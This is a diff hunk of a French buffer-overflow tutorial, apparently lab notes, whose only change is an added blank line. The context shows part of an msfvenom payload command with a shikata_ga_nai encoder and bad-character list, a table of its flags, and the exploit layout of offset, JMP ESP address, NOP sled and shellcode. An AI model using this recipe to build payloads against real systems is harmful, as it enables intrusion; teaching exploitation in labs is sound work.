@@ -35,6 +35,7 @@ LPORT=666 -f c -e x86/shikata_ga_nai -b "\x00\x0D\xFF"
 | -e        | x86/shikata_ga_nai        | encodeur               |
 | -b        | "\x00\x0D\xFF"            | liste des Badchar      |
 
+
 - Maintenant, créer l'exploit avec :
 ```
 offset + Adresse de JMPESP(inversé) + nb * NoP + Shellcode
